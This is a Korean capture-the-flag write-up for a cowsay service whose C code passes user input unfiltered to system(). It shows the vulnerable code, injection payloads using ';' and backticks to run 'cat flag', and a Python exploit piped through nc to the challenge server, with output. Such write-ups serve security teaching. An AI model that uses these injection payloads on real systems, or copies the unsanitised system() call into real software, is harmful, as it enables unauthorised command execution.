#### 1. 문제 분석

```C
fgets(message, 256, stdin);
snprintf(cmd, 1024, "/usr/games/cowsay -%c %s", cow_face[rand()%8], message);
system(cmd);
```

이번 문제의 핵심적인 부분은 이 3줄의 코드가 되겠습니다.

우리가 입력한 값(message변수의 값)이 바로 시스템함수에 의해 실행이 되는군요!

필터링이 되거나 하지 않기때문에 아무 시스템 명령어나 바로 넣을 수 있습니다.

예를 들어 `lalala; ls -al` 를 넣는다면 `system(/usr/games/cowsay -w lalala; ls -al)` 를 실행하게 되는것이죠.

그러면 결국 /usr/games/cowsay -w lalala 뿐만 아니라 ls -al 도 실행이 되어 결과를 받아 볼 수 있습니다.


#### 2. 문제 풀이

정말 여러가지 풀이방법이 존재하겠지만 여기서는 두가지 방법만 소개하도록 하겠습니다.

1. ; 를 이용하여 여러 명령어를 실행 -> ;cat flag

2. \`\` 백쿼터를 사용하여 명령어를 먼저 실행시킨후 그 값을 받아보기 -> \`cat flag\`

#### 3. Exploit Code

```Python
# exploit.py
payload = ""
payload+= "3\n"          # Select "3. Cow echo"
payload+= "`cat flag`\n" # System command injection! Get the flag.

print payload
```

```Shell
$ (python exploit.py; cat) | nc play.hexa.pro 7777
What does the cow say!

1. Cow fortune
2. Cow time
3. Cow echo
4. Exit

Select: 3
What do you want to say? `cat flag`
 _________________________________
< C0mm4nd 1nj3ctiOn! Great JOB :) >
 ---------------------------------
        \   ^__^
         \  ($$)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

What does the cow say!

1. Cow fortune
2. Cow time
3. Cow echo
4. Exit

Select: 4
 ______
< bye~ >
 ------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

```
